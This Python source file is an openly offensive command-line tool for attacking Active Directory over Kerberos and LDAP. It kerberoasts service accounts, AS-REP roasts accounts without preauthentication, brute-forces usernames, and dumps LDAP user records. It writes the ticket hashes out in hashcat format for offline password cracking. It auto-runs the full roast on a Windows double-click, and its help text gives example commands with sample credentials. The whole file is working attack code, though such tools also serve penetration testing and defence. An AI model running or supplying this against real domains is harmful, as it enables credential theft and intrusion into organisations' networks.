#!/usr/bin/env python3
#
# Author:
#  Tamas Jos (@skelsec)
#


from msldap.ldap_objects.aduser import MSADUser, MSADUser_TSV_ATTRS
from msldap.commons.url import MSLDAPURLDecoder
from msldap import logger as msldaplogger

from minikerberos import logger as kerblogger
from minikerberos.security import KerberosUserEnum, APREPRoast, Kerberoast
from msldap.authentication.kerberos.gssapi import get_gssapi, GSSWrapToken, KRB5_MECH_INDEP_TOKEN
from minikerberos.common.url import KerberosClientURL, kerberos_url_help_epilog
from minikerberos.common.spn import KerberosSPN
from minikerberos.common.creds import KerberosCredential
from minikerberos.common.target import KerberosTarget
from minikerberos.aioclient import AIOKerberosClient
from minikerberos.common.utils import TGSTicket2hashcat
from minikerberos.protocol.asn1_structs import AP_REQ, TGS_REQ

import asyncio
import ntpath
import logging
import getpass
import os
import csv
import platform
import sys
from urllib.parse import urlparse, parse_qs
import datetime


kerberoast_epilog = """==== Extra Help ====
Dump all users from LDAP in a TSV file:
   - kerberoast ldap full 'ldap://TEST\\victim:Passw0rd!1@10.10.10.2' -o users

List all kerberoastable users: 
   - kerberoast ldap spn 'ldap://TEST\\victim:Passw0rd!1@10.10.10.2'

List all asreproastable users users: 
   - kerberoast ldap asrep 'ldap://TEST\\victim:Passw0rd!1@10.10.10.2'

Brute-force guss of usernames via kerberos:
	(username_dict.txt is a list of usernames (without domain) one username per line)
   - kerberoast brute TEST.corp 10.10.10.2 username_dict.txt
   
ASREProast:
   - kerberoast asreproast 10.10.10.2 -u asreptest@TEST
   
Kerberoast (spnroast):
   - kerberoast spnroast 'kerberos+pw://TEST\\victim:Password@10.10.10.2' -u srv_http@test

Kerberoast using SSPI (spnroast-sspi WINDOWS ONLY!):
   - kerberoast spnroast-sspi -u srv_http@TEST

Auto (WINDOWS ONLY! use SSPI for authentication, grabs target users via ldap, peforms spn and asreproast):
   - kerberoast auto 10.10.10.2
   
TGT (get a TGT for given user credential and store it in a CCACHE file):
   - kerberoast tgt 'kerberos+pw://TEST\\victim:Password@10.10.10.2' user.ccache
   
TGS (get a TGS for given SPN and store it in a CCACHE file):
   - kerberoast tgs 'kerberos+pw://TEST\\victim:Password@10.10.10.2' srv_http@test user.ccache

For more information on kerberos and LDAP connection string options please consult the README of minikerberos and msldap respectively
"""

async def spnmultiplexor(args):
	try:
		from multiplexor.operator.external.sspi import KerberosSSPIClient
		from multiplexor.operator import MultiplexorOperator
	except ImportError as error:
		print('Failed to import multiplexor module! You will need to install multiplexor to get this working!')

	logger = logging.getLogger('websockets')
	logger.setLevel(100)
	if args.verbose > 2:
		logger.setLevel(logging.INFO)

	try:
		logging.debug('[SPN-MP] input URL: %s' % args.mp_url)
		url_e = urlparse(args.mp_url)
		agentid = url_e.path.replace('/','')
		logging.debug('[SPN-MP] agentid: %s' % agentid)

		targets = get_targets_from_file(args)
		targets += get_target_from_args(args)
		if len(targets) == 0:
			raise Exception('No targets were specified! Either use target file or specify target via cmdline')
		
		logging.debug('[SPN-MP] loaded %s targets' % len(targets))
		operator = MultiplexorOperator(args.mp_url)
		await operator.connect()
		#creating virtual sspi server
		results = []
		for target in targets:
			server_info = await operator.start_sspi(agentid)
			#print(server_info)
			sspi_url = 'ws://%s:%s' % (server_info['listen_ip'], server_info['listen_port'])
			#print(sspi_url)
			ksspi = KerberosSSPIClient(sspi_url)
			await ksspi.connect()

			apreq, err = await ksspi.authenticate(target.get_formatted_pname())
			if err is not None:
				logging.debug('[SPN-MP] error occurred while roasting %s: %s' % (target.get_formatted_pname(), err))
				continue
			unwrap = KRB5_MECH_INDEP_TOKEN.from_bytes(apreq)
			aprep = AP_REQ.load(unwrap.data[2:]).native
			results.append(TGSTicket2hashcat(aprep))

		if args.out_file:
			with open(args.out_file, 'w', newline = '') as f:
				for thash in results:
					f.write(thash + '\r\n')

		else:
			for thash in results:
				print(thash)

	except Exception as e:
		logging.exception('[SPN-MP] exception!')

def get_targets_from_file(args, to_spn = True):
	targets = []
	if args.targets:
		with open(args.targets, 'r') as f:
			for line in f:
				line = line.strip()
				domain = None
				username = None
				if line.find('@') != -1:
					#we take for granted that usernames do not have the char @ in them!
					username, domain = line.split('@')
				else:
					username = line
				
				if args.realm:
					domain = args.realm
				else:
					if domain is None:
						raise Exception('Realm is missing. Either use the -r parameter or store the target users in <realm>/<username> format in the targets file')
				
				if to_spn is True:
					target = KerberosSPN()
					target.username = username
					target.domain = domain
				else:
					target = KerberosCredential()
					target.username = username
					target.domain = domain
				targets.append(target)
	return targets

def get_target_from_args(args, to_spn = True):
	targets = []
	if args.user:
		for user in args.user:
			domain = None
			username = None
			if user.find('@') != -1:
				#we take for granted that usernames do not have the char / in them!
				username, domain = user.split('@')
			else:
				username = user

			if args.realm:
				domain = args.realm
			else:
				if domain is None:
					raise Exception('Realm is missing. Either use the -r parameter or store the target users in <realm>/<username> format in the targets file')
			if to_spn is True:
				target = KerberosSPN()
				target.username = username
				target.domain = domain
			else:
				target = KerberosCredential()
				target.username = username
				target.domain = domain
			targets.append(target)
	return targets

async def run_auto():
	try:
		if platform.system() != 'Windows':
			print('[-]This command only works on Windows!')
			return
		try:
			from winsspi.sspi import KerberoastSSPI
		except ImportError:
			raise Exception('winsspi module not installed!')

		from winacl.functions.highlevel import get_logon_info
		
		logon = get_logon_info()
		domain = logon['domain']
		url = 'ldap+sspi-ntlm://%s' % logon['logoserver']
		msldap_url = MSLDAPURLDecoder(url)
		client = msldap_url.get_client()
		_, err = await client.connect()
		if err is not None:
			raise err

		domain = client._ldapinfo.distinguishedName.replace('DC=','').replace(',','.')
		spn_users = []
		asrep_users = []
		errors = []
		spn_cnt = 0
		asrep_cnt = 0
		async for user, err in client.get_all_knoreq_users():
			if err is not None:
				raise err
			cred = KerberosCredential()
			cred.username = user.sAMAccountName
			cred.domain = domain
			
			asrep_users.append(cred)
		async for user, err in client.get_all_service_users():
			if err is not None:
				raise err
			cred = KerberosCredential()
			cred.username = user.sAMAccountName
			cred.domain = domain
			
			spn_users.append(cred)
			
		for cred in asrep_users:
			results = []
			ks = KerberosTarget(domain)
			ar = APREPRoast(ks)
			res = await ar.run(cred, override_etype = [23])
			results.append(res)	
			
		filename = 'asreproast_%s_%s.txt' % (logon['domain'], datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S"))
		with open(filename, 'w', newline = '') as f:
				for thash in results:
					asrep_cnt += 1
					f.write(thash + '\r\n')

		results = []
		for cred in spn_users:
			spn_name = '%s@%s' % (cred.username, cred.domain)
			if spn_name[:6] == 'krbtgt':
				continue
			ksspi = KerberoastSSPI()
			try:
				ticket = ksspi.get_ticket_for_spn(spn_name)
			except Exception as e:
				errors.append((spn_name, e))
				continue
			results.append(TGSTicket2hashcat(ticket))
		
		filename = 'spnroast_%s_%s.txt' % (logon['domain'], datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S"))
		with open(filename, 'w', newline = '') as f:
			for thash in results:
				spn_cnt += 1
				f.write(thash + '\r\n')
				
		for err in errors:
			print('Failed to get ticket for %s. Reason: %s' % (err[0], err[1]))
	
		print('[+] Done! %s spnroast tickets %s asreproast tickets' % (spn_cnt, asrep_cnt))
	except Exception as e:
		print(e)


async def amain(args):
	if args.command == 'tgs':
		logging.debug('[TGS] started')
		ku = KerberosClientURL.from_url(args.kerberos_connection_url)
		cred = ku.get_creds()
		target = ku.get_target()
		spn = KerberosSPN.from_user_email(args.spn)

		logging.debug('[TGS] target user: %s' % spn.get_formatted_pname())
		logging.debug('[TGS] fetching TGT')
		kcomm = AIOKerberosClient(cred, target)
		await kcomm.get_TGT()
		logging.debug('[TGS] fetching TGS')
		await kcomm.get_TGS(spn)
		
		kcomm.ccache.to_file(args.out_file)
		logging.debug('[TGS] done!')

	elif args.command == 'tgt':
		logging.debug('[TGT] started')
		ku = KerberosClientURL.from_url(args.kerberos_connection_url)
		cred = ku.get_creds()
		target = ku.get_target()

		logging.debug('[TGT] cred: %s' % cred)
		logging.debug('[TGT] target: %s' % target)

		kcomm = AIOKerberosClient(cred, target)
		logging.debug('[TGT] fetching TGT')
		await kcomm.get_TGT()
		
		kcomm.ccache.to_file(args.out_file)
		logging.debug('[TGT] Done! TGT stored in CCACHE file')

	elif args.command == 'asreproast':
		if not args.targets and not args.user:
			raise Exception('No targets loaded! Either -u or -t MUST be specified!')
		creds = []
		targets = get_targets_from_file(args, False)
		targets += get_target_from_args(args, False)
		if len(targets) == 0:
			raise Exception('No targets were specified! Either use target file or specify target via cmdline')

		logging.debug('[ASREPRoast] loaded %d targets' % len(targets))
		logging.debug('[ASREPRoast] will suppoort the following encryption type: %s' % (str(args.etype)))

		ks = KerberosTarget(args.address)
		ar = APREPRoast(ks)
		hashes = []
		for target in targets:
			h = await ar.run(target, override_etype = [args.etype])
			hashes.append(h)

		if args.out_file:
			with open(args.out_file, 'w', newline = '') as f:
				for thash in hashes:
					f.write(thash + '\r\n')

		else:
			for thash in hashes:
				print(thash)

		logging.info('ASREPRoast complete')

	elif args.command == 'spnroast':
		if not args.targets and not args.user:
			raise Exception('No targets loaded! Either -u or -t MUST be specified!')

		targets = get_targets_from_file(args)
		targets += get_target_from_args(args)
		if len(targets) == 0:
			raise Exception('No targets were specified! Either use target file or specify target via cmdline')

		logging.debug('Kerberoast loaded %d targets' % len(targets))

		if args.etype:
			if args.etype == -1:
				etypes = [23, 17, 18]
			else:
				etypes = [args.etype]
		else:
			etypes = [23, 17, 18]

		logging.debug('Kerberoast will suppoort the following encryption type(s): %s' % (','.join(str(x) for x in etypes)))
		
		ku = KerberosClientURL.from_url(args.kerberos_connection_url)
		cred = ku.get_creds()
		target = ku.get_target()
		ar = Kerberoast(target, cred)
		hashes = await ar.run(targets, override_etype = etypes)

		if args.out_file:
			with open(args.out_file, 'w', newline = '') as f:
				for thash in hashes:
					f.write(thash + '\r\n')

		else:
			for thash in hashes:
				print(thash)

		logging.info('Kerberoast complete')

	elif args.command == 'brute':
		target = KerberosTarget(args.address)

		with open(args.targets, 'r') as f:
			for line in f:
				line = line.strip()
				spn = KerberosSPN()
				spn.username = line
				spn.domain = args.realm
				
				ke = KerberosUserEnum(target, spn)
			
				result = await ke.run()
				if result is True:
					if args.out_file:
						with open(args.out_file, 'a') as f:
							f.write(result + '\r\n')
					else:
						print('[+] Enumerated user: %s' % str(spn))

		logging.info('Kerberos user enumeration complete')

	elif args.command == 'spnroast-sspi':
		if platform.system() != 'Windows':
			print('[-]This command only works on Windows!')
			return
		try:
			from winsspi.sspi import KerberoastSSPI
		except ImportError:
			raise Exception('winsspi module not installed!')
			
		if not args.targets and not args.user:
			raise Exception('No targets loaded! Either -u or -t MUST be specified!')
		
		targets = get_targets_from_file(args)
		targets += get_target_from_args(args)
		if len(targets) == 0:
			raise Exception('No targets were specified! Either use target file or specify target via cmdline')
		
		results = []
		errors = []
		for spn_name in targets:
			ksspi = KerberoastSSPI()
			try:
				ticket = ksspi.get_ticket_for_spn(spn_name.get_formatted_pname())
			except Exception as e:
				errors.append((spn_name, e))
				continue
			results.append(TGSTicket2hashcat(ticket))
			
		if args.out_file:
			with open(args.out_file, 'w', newline = '') as f:
				for thash in results:
					f.write(thash + '\r\n')

		else:
			for thash in results:
				print(thash)
		
		for err in errors:
			print('Failed to get ticket for %s. Reason: %s' % (err[0], err[1]))

		logging.info('SSPI based Kerberoast complete')

	elif args.command == 'spnroast-multiplexor':
		#hiding the import so it's not necessary to install multiplexor
		await spnmultiplexor(args)

	elif args.command == 'auto':
		await run_auto()
		
	elif args.command == 'ldap':
		ldap_url = MSLDAPURLDecoder(args.ldap_url)
		client = ldap_url.get_client()
		_, err = await client.connect()
		if err is not None:
			raise err

		domain = client._ldapinfo.distinguishedName.replace('DC=','').replace(',','.')

		if args.out_file:
			basefolder = ntpath.dirname(args.out_file)
			basefile = ntpath.basename(args.out_file)

		if args.type in ['spn','all']:
			logging.debug('Enumerating SPN user accounts...')
			cnt = 0
			if args.out_file:
				with open(os.path.join(basefolder,basefile+'_spn_users.txt'), 'w', newline='') as f:
					async for user in client.get_all_service_users():
						cnt += 1
						f.write('%s@%s\r\n' % (user.sAMAccountName, domain))
			
			else:
				print('[+] SPN users')
				async for user, err in client.get_all_service_users():
					if err is not None:
						raise err
					cnt += 1
					print('%s@%s' % (user.sAMAccountName, domain))
			
			logging.debug('Enumerated %d SPN user accounts' % cnt)

		if args.type in ['asrep','all']:
			logging.debug('Enumerating ASREP user accounts...')
			ctr = 0
			if args.out_file:
				with open(os.path.join(basefolder,basefile+'_asrep_users.txt'), 'w', newline='') as f:
					async for user, err in client.get_all_knoreq_users():
						if err is not None:
							raise err
						ctr += 1
						f.write('%s@%s\r\n' % (user.sAMAccountName, domain))
			else:
				print('[+] ASREP users')
				async for user, err in client.get_all_knoreq_users():
					if err is not None:
						raise err
					ctr += 1
					print('%s@%s' % (user.sAMAccountName, domain))

			logging.debug('Enumerated %d ASREP user accounts' % ctr)

		if args.type in ['full', 'all']:
			logging.debug('Enumerating ALL user accounts, this will take some time depending on the size of the domain')
			ctr = 0
			attrs = args.attrs if args.attrs is not None else MSADUser_TSV_ATTRS
			if args.out_file:
				with open(os.path.join(basefolder,basefile+'_ldap_users.tsv'), 'w', newline='', encoding ='utf8') as f:
					writer = csv.writer(f, delimiter = '\t')
					writer.writerow(attrs)
					async for user, err in client.get_all_users():
						if err is not None:
							raise err
						ctr += 1
						writer.writerow(user.get_row(attrs))

			else:
				logging.debug('Are you sure about this?')
				print('[+] Full user dump')
				print('\t'.join(attrs))
				async for user, err in client.get_all_users():
					if err is not None:
						raise err
					ctr += 1
					print('\t'.join([str(x) for x in user.get_row(attrs)]))

			
			logging.debug('Enumerated %d user accounts' % ctr)

		if args.type in ['custom']:
			if not args.filter:
				raise Exception('Custom LDAP search requires the search filter to be specified!')
			if not args.attrs:
				raise Exception('Custom LDAP search requires the attributes to be specified!')

			logging.debug('Perforing search on the AD with the following filter: %s' % args.filter)
			logging.debug('Search will contain the following attributes: %s' % ','.join(args.attrs))
			ctr = 0

			if args.out_file:
				with open(os.path.join(basefolder,basefile+'_ldap_custom.tsv'), 'w', newline='') as f:
					writer = csv.writer(f, delimiter = '\t')
					writer.writerow(args.attrs)
					async for obj, err in client.pagedsearch(args.filter, args.attrs):
						if err is not None:
							raise err
						ctr += 1
						writer.writerow([str(obj['attributes'].get(x, 'N/A')) for x in args.attrs])

			else:
				async for obj, err in client.pagedsearch(args.filter, args.attrs):
					if err is not None:
						raise err
					ctr += 1
					print('\t'.join([str(obj['attributes'].get(x, 'N/A')) for x in args.attrs]))


def main():
	if platform.system().upper() == 'WINDOWS' and len(sys.argv) == 1:
		#auto start on double click with default settings
		asyncio.run(run_auto())
		return

	import argparse

	parser = argparse.ArgumentParser(description='Tool to perform verious kerberos security tests', formatter_class=argparse.RawDescriptionHelpFormatter, epilog = kerberoast_epilog)
	parser.add_argument('-v', '--verbose', action='count', default=0, help='Increase verbosity, can be stacked')


	subparsers = parser.add_subparsers(help = 'commands')
	subparsers.required = True
	subparsers.dest = 'command'

	ldap_group = subparsers.add_parser('ldap', formatter_class=argparse.RawDescriptionHelpFormatter, help='Enumerate potentially vulnerable users via LDAP', epilog = MSLDAPURLDecoder.help_epilog)
	ldap_group.add_argument('type', choices=['spn', 'asrep', 'full','custom', 'all'], help='type of vulnerable users to enumerate')
	ldap_group.add_argument('ldap_url',  help='LDAP connection URL')
	ldap_group.add_argument('-o','--out-file',  help='Output file base name, if omitted will print results to STDOUT')
	ldap_group.add_argument('-f','--filter',  help='CUSTOM mode only. LDAP search filter')
	ldap_group.add_argument('-a','--attrs', action='append', help='FULL and CUSTOM mode only. LDAP attributes to display')

	brute_group = subparsers.add_parser('brute', help='Enumerate users via brute-forcing kerberos service')
	brute_group.add_argument('realm', help='Kerberos realm <COMPANY.corp>')
	brute_group.add_argument('address', help='Address of the DC')
	brute_group.add_argument('targets', help='File with a list of usernames to enumerate, one user per line')
	brute_group.add_argument('-o','--out-file',  help='Output file base name, if omitted will print results to STDOUT')

	asreproast_group = subparsers.add_parser('asreproast', help='Perform asrep roasting')
	asreproast_group.add_argument('address', help='Address of the DC')
	asreproast_group.add_argument('-t','--targets', help='File with a list of usernames to roast, one user per line')
	asreproast_group.add_argument('-r','--realm', help='Kerberos realm <COMPANY.corp> This overrides realm specification got from the target file, if any')
	asreproast_group.add_argument('-o','--out-file',  help='Output file base name, if omitted will print results to STDOUT')
	asreproast_group.add_argument('-u','--user',  action='append', help='Target users to roast in <realm>/<username> format or just the <username>, if -r is specified. Can be stacked.')
	asreproast_group.add_argument('-e','--etype', default=23, const=23, nargs='?', choices= [23, 17, 18], type=int, help = 'Set preferred encryption type')


	spnroast_group = subparsers.add_parser('spnroast', help='Perform spn roasting (aka kerberoasting)',formatter_class=argparse.RawDescriptionHelpFormatter, epilog = kerberos_url_help_epilog)
	spnroast_group.add_argument('kerberos_connection_url', help='Either CCACHE file name or Kerberos login data in the following format: <domain>/<username>/<secret_type>:<secret>@<dc_ip_or_hostname>')
	spnroast_group.add_argument('-t','--targets', help='File with a list of usernames to roast, one user per line')
	spnroast_group.add_argument('-u','--user',  action='append', help='Target users to roast in <realm>/<username> format or just the <username>, if -r is specified. Can be stacked.')
	spnroast_group.add_argument('-o','--out-file',  help='Output file base name, if omitted will print results to STDOUT')
	spnroast_group.add_argument('-r','--realm', help='Kerberos realm <COMPANY.corp> This overrides realm specification got from the target file, if any')
	spnroast_group.add_argument('-e','--etype', default=-1, const=-1, nargs='?', choices= [23, 17, 18, -1], type=int, help = 'Set preferred encryption type. -1 for all')

	spnroastsspi_group = subparsers.add_parser('spnroast-sspi', help='Perform spn roasting (aka kerberoasting)')
	spnroastsspi_group.add_argument('-t','--targets', help='File with a list of usernames to roast, one user per line')
	spnroastsspi_group.add_argument('-u','--user',  action='append', help='Target users to roast in <realm>/<username> format or just the <username>, if -r is specified. Can be stacked.')
	spnroastsspi_group.add_argument('-o','--out-file',  help='Output file base name, if omitted will print results to STDOUT')
	spnroastsspi_group.add_argument('-r','--realm', help='Kerberos realm <COMPANY.corp> This overrides realm specification got from the target file, if any')
	
	multiplexorsspi_group = subparsers.add_parser('spnroast-multiplexor', help='')
	multiplexorsspi_group.add_argument('-t','--targets', help='File with a list of usernames to roast, one user per line')
	multiplexorsspi_group.add_argument('-u','--user',  action='append', help='Target users to roast in <realm>/<username> format or just the <username>, if -r is specified. Can be stacked.')
	multiplexorsspi_group.add_argument('-o','--out-file',  help='Output file base name, if omitted will print results to STDOUT')
	multiplexorsspi_group.add_argument('-r','--realm', help='Kerberos realm <COMPANY.corp> This overrides realm specification got from the target file, if any')
	multiplexorsspi_group.add_argument('mp_url', help='Multiplexor URL in the following format: ws://host:port/agentid or wss://host:port/agentid')
	


	tgt_group = subparsers.add_parser('tgt', help='Fetches a TGT for the given user credential',formatter_class=argparse.RawDescriptionHelpFormatter, epilog = kerberos_url_help_epilog)
	tgt_group.add_argument('kerberos_connection_url', help='Either CCACHE file name or Kerberos login data in the following format: <domain>/<username>/<secret_type>:<secret>@<dc_ip_or_hostname>')
	tgt_group.add_argument('out_file',  help='Output CCACHE file')
	
	tgs_group = subparsers.add_parser('tgs', help='Fetches a TGT for the given user credential',formatter_class=argparse.RawDescriptionHelpFormatter, epilog = kerberos_url_help_epilog)
	tgs_group.add_argument('kerberos_connection_url', help='Either CCACHE file name or Kerberos login data in the following format: <domain>/<username>/<secret_type>:<secret>@<dc_ip_or_hostname>')
	tgs_group.add_argument('spn',  help='SPN strong of the service to get TGS for. Expected format: <domain>/<hostname>')
	tgs_group.add_argument('out_file',  help='Output CCACHE file')
	

	auto_group = subparsers.add_parser('auto', help='Just get the tickets already. Only works on windows under any domain-user context')
	auto_group.add_argument('dc_ip', help='Target domain controller')
	auto_group.add_argument('-o','--out-file',  help='Output file base name, if omitted will print results to STDOUT')
	auto_group.add_argument('-e','--etype', default=23, const=23, nargs='?', choices= [23, 17, 18], type=int, help = 'Set preferred encryption type')


	args = parser.parse_args()

	if args.verbose == 0:
		logging.basicConfig(level=logging.INFO)
		kerblogger.setLevel(logging.WARNING)
		msldaplogger.setLevel(logging.WARNING)
		
	elif args.verbose == 1:
		logging.basicConfig(level=logging.DEBUG)
		kerblogger.setLevel(logging.INFO)
		msldaplogger.setLevel(logging.INFO)
		
	else:
		logging.basicConfig(level=1)
		kerblogger.setLevel(logging.DEBUG)
		msldaplogger.setLevel(logging.DEBUG)
	
	asyncio.run(amain(args))
	
if __name__ == '__main__':
	main()
